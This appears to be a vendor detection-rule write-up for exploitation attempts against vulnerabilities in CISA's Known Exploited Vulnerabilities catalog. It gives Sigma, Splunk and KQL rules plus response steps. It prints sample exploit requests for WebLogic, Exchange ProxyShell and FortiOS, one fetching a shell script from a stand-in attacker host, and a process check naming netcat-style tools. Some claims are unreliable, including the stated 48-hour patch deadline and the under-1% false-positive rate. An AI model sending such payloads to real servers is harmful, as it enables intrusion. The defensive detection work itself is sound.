# dugganusa-010: CISA KEV Exploitation Attempts

**Category:** Vulnerability Management
**Severity:** Critical
**False Positive Rate:** Very Low (<1%)
**MITRE ATT&CK:** T1190 (Exploit Public-Facing Application)

## Overview

Detects exploitation attempts targeting vulnerabilities in CISA's Known Exploited Vulnerabilities (KEV) catalog. These are CVEs confirmed to be actively exploited in the wild by threat actors. If you're seeing this alert, you're under active attack.

## The Problem

**CISA KEV = Confirmed Exploitation:** CISA only adds vulnerabilities to KEV when they have evidence of active, in-the-wild exploitation. This isn't theoretical—real attackers are using these exploits right now.

**Current High-Priority Targets (Nov 2025):**
- **CVE-2025-21042** - Samsung out-of-bounds write (mobile exploitation)
- **Oracle WebLogic** - Remote code execution (enterprise servers)
- **Microsoft Exchange** - ProxyShell/ProxyLogon variants (email servers)
- **Fortinet FortiOS** - Authentication bypass (VPN appliances)
- **Cisco IOS** - Command injection (network devices)
- **Apache Struts** - OGNL injection (legacy web apps)

## Detection Logic

**Two detection paths:**

**Path 1: CVE Pattern Matching**
- Match CVE IDs in logs against CISA KEV catalog
- Focus on CVE-2025-*, CVE-2024-*, CVE-2023-* (recent exploits)
- Software version detection (Oracle WebLogic, Microsoft Exchange, Fortinet, Cisco, Apache Struts)

**Path 2: Exploit Pattern Matching**
- Known exploit URLs:
  - `/wls-wsat/` (Oracle WebLogic WSAT RCE)
  - `/owa/auth/` (Microsoft Exchange ProxyShell)
  - `/api/v2/cmdb/` (Fortinet FortiOS API exploit)
  - `/_ignition/execute-solution` (Laravel Ignition RCE)

**Sigma Rule:**

```yaml
title: CISA KEV Exploitation Attempts
id: dugganusa-010-cisa-kev-exploit
status: production
description: Exploitation targeting CISA Known Exploited Vulnerabilities
author: DugganUSA LLC
date: 2025-11-19
references:
    - https://www.cisa.gov/known-exploited-vulnerabilities-catalog
tags:
    - attack.initial_access
    - attack.t1190
logsource:
    category: application
detection:
    selection_cve:
        - cve_id:
            - 'CVE-2025-21042'  # Samsung OOB Write
            - 'CVE-2024-*'      # Recent high-severity
            - 'CVE-2023-*'      # Older unpatched
        - software_version:
            - 'Oracle WebLogic'
            - 'Microsoft Exchange'
            - 'Fortinet FortiOS'
            - 'Cisco IOS'
            - 'Apache Struts'
    selection_exploit_pattern:
        request_uri|contains:
            - '/wls-wsat/'
            - '/owa/auth/'
            - '/api/v2/cmdb/'
            - '/_ignition/execute-solution'
    condition: selection_cve or selection_exploit_pattern
fields:
    - src_ip
    - cve_id
    - software_version
    - request_uri
falsepositives:
    - Vulnerability scanners (GreyNoise, Shodan)
    - Security researchers
level: critical
```

## SIEM Implementations

### Splunk SPL

```spl
index=ids OR index=vulnerability OR index=web
| where match(cve_id, "CVE-2025-21042|CVE-2024-|CVE-2023-")
    OR match(software, "(?i)(Oracle WebLogic|Microsoft Exchange|Fortinet|Cisco IOS|Apache Struts)")
    OR match(request_uri, "(?i)(/wls-wsat/|/owa/auth/|/api/v2/cmdb/|/_ignition/execute-solution)")
| lookup cisa_kev_catalog cve OUTPUT kev_status exploit_status date_added
| where kev_status="active" OR exploit_status="confirmed"
| stats count by src_ip, cve_id, software, request_uri, kev_status, date_added
| eval severity="CRITICAL"
| eval mitre="T1190 - Exploit Public-Facing Application"
| eval action="BLOCK + PATCH IMMEDIATELY"
| table src_ip, cve_id, software, request_uri, kev_status, date_added, count, action
| sort -count
```

### KQL (Azure Sentinel)

```kql
// CISA KEV Exploitation Detection
let KEVCatalog = externaldata(cve:string, vendor:string, product:string, vulnerability:string, date_added:datetime)
[@"https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json"] with (format="multijson");
CommonSecurityLog
| where TimeGenerated > ago(24h)
| extend CVE = extract("(CVE-\\d{4}-\\d+)", 1, Message)
| where isnotempty(CVE)
| join kind=inner (
    KEVCatalog
    | where date_added > ago(365d)  // KEV added in last year
  ) on $left.CVE == $right.cve
| summarize
    AttemptCount=count(),
    UniqueSources=dcount(SourceIP),
    VulnerabilityDetails=any(vulnerability)
  by CVE, vendor, product
| extend Severity = "Critical"
| extend MITRE = "T1190 - Exploit Public-Facing Application"
| extend Action = "BLOCK IP + EMERGENCY PATCH"
| sort by AttemptCount desc
```

## Example Attack Scenarios

### Scenario 1: Oracle WebLogic WSAT RCE (CVE-2017-10271)

```http
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: vulnerable-server.com
Content-Type: text/xml

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java><void class="java.lang.ProcessBuilder">
        <array class="java.lang.String" length="3">
          <void index="0"><string>/bin/bash</string></void>
          <void index="1"><string>-c</string></void>
          <void index="2"><string>wget http://attacker.com/shell.sh | bash</string></void>
        </array>
      </void></java>
    </work:WorkContext>
  </soapenv:Header>
</soapenv:Envelope>
```

**Detection:** Request URI contains `/wls-wsat/`

### Scenario 2: Microsoft Exchange ProxyShell (CVE-2021-34473)

```http
POST /owa/auth/Current/themes/resources/../../../../autodiscover/autodiscover.json?@foo.com/owa/?&Email=autodiscover/autodiscover.json%3F@foo.com&CorrelationID=<empty>;&ClientId=<empty>;&cafeReqId=<empty>; HTTP/1.1
Host: mail.example.com
```

**Detection:** Request URI contains `/owa/auth/` + path traversal patterns

### Scenario 3: Fortinet FortiOS API Exploit (CVE-2022-40684)

```http
GET /api/v2/cmdb/system/admin/admin HTTP/1.1
Host: vpn.example.com
User-Agent: Report Runner
Forwarded: for="[127.0.0.1]:8888";by="[127.0.0.1]:9999"
```

**Detection:** Request URI contains `/api/v2/cmdb/` + authentication bypass headers

## False Positives

**Very low false positive rate (<1%) due to:**

1. **Specific Exploit Patterns:** Detection targets exact exploit URLs, not generic patterns
2. **CISA Validation:** Only flags CVEs confirmed by CISA as exploited
3. **Contextual Matching:** Combines CVE + software version + exploit pattern

**Known FP sources:**
- **Vulnerability Scanners:** Shodan, Censys, GreyNoise crawlers probing for vulnerabilities
- **Security Researchers:** Authorized penetration testers

**Mitigation:**
- Whitelist authorized scanner IPs (document approval)
- Correlate with GreyNoise "benign" tags
- Verify no successful exploitation (check for 200 OK responses)

## Remediation

**CRITICAL RESPONSE REQUIRED:**

### Immediate Actions (Within 1 Hour)

1. **Block Source IP:** Add to firewall blocklist immediately
2. **Isolate Affected System:** Disconnect from network if exploitation suspected
3. **Emergency Patch:** Apply vendor patch ASAP (CISA KEV = patch within 48 hours for federal agencies)
4. **Incident Response:** Activate IR team, assume compromise until proven otherwise

### Investigation (Within 24 Hours)

```bash
# Check if system vulnerable
nmap -sV --script vuln <target-ip>

# Search logs for successful exploitation
grep -i "200 OK" /var/log/apache2/access.log | grep "/wls-wsat/"

# Check for webshells
find /var/www -name "*.jsp" -o -name "*.jspx" -mtime -7

# Review process list for suspicious activity
ps aux | grep -E "(nc|ncat|socat|wget|curl)" | grep -v grep
```

### Long-term Hardening

1. **Subscribe to CISA KEV Feed:** https://www.cisa.gov/known-exploited-vulnerabilities-catalog
2. **Automated Patching:** Implement 48-hour SLA for KEV patches
3. **Virtual Patching:** Use WAF rules to block exploit patterns while patching
4. **Asset Inventory:** Know what software versions you're running (SBOM)

## CISA KEV Catalog Integration

**Automated KEV Checking:**

```bash
#!/bin/bash
# Download latest CISA KEV catalog
curl -s https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json > kev.json

# Check if your CVE is in KEV
CVE="CVE-2025-21042"
if grep -q "$CVE" kev.json; then
  echo "CRITICAL: $CVE is actively exploited (CISA KEV)"
  echo "Patch immediately or implement virtual patch"
else
  echo "$CVE not in CISA KEV catalog"
fi
```

## References

- **CISA KEV Catalog:** https://www.cisa.gov/known-exploited-vulnerabilities-catalog
- **Binding Operational Directive 22-01:** Federal agencies must patch KEV within 48 hours
- **MITRE ATT&CK T1190:** https://attack.mitre.org/techniques/T1190/

## Attribution

**Source:** CISA KEV Catalog (updated daily)
**Implementation:** DugganUSA LLC
**License:** Free for non-commercial use. Commercial use requires attribution.

---

**Democratic Sharing Law** - CISA publishes KEV for free. We convert it to detection rules for free. Exploits don't care about budgets.
